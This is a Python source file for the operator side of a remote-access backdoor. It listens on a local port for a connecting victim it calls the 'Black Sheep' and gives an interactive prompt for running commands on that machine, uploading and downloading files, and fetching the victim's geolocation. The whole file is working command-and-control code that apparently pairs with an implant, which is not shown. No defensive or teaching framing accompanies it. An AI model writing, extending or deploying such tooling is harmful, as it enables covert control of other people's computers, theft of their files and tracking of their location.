# python 3.11.7

import socket
import marshal

class Server:
    # Connections settings
    def __init__(self, ip, port) -> None:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        server.bind((ip, port))
        server.listen(0)
        print("[+] Waiting for the Black Sheep........")
        self.connection, address = server.accept()
        print("[+] Found the Black Sheep...."+str(address))
    
    def reliable_send(self, data):
        marshal_data = marshal.dumps(data)
        self.connection.send(marshal_data)
    
    def reliable_receive(self):
        marshal_data = bytes("".encode())
        while True:
            try:
                marshal_data =  marshal_data+self.connection.recv(1024)
                return marshal.loads(marshal_data)
            except EOFError:
                continue
    # Skills
    def run_command(self, command):
        self.reliable_send(command)
        if command[0] == "EXIT":
            self.connection.close()
            exit()
        return self.reliable_receive()
    
    def get_geo(self):
        command = ""
        self.reliable_send(command)
        return self.reliable_receive()
    
    def write_file(self, path, content):
        with open(path, "wb+") as file:
            file.write(content)
            file.close()
            return "[+]Downloading Black Sheep file"
    def read_file(self, path):
        with open(path, "rb") as f:
            return f.read()
        f.close()
    def run(self):
        while True:
            command = input(">>> ")
            command = command.split(" ")
            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(file_content)
            result = self.run_command(command)#.encode()
            
            if command[0] == "download":
                result = self.write_file(command[1], result)
            try:
                print(result.decode())
            except AttributeError:
                print(result)

skills = Server("localhost", 2463)
skills.run()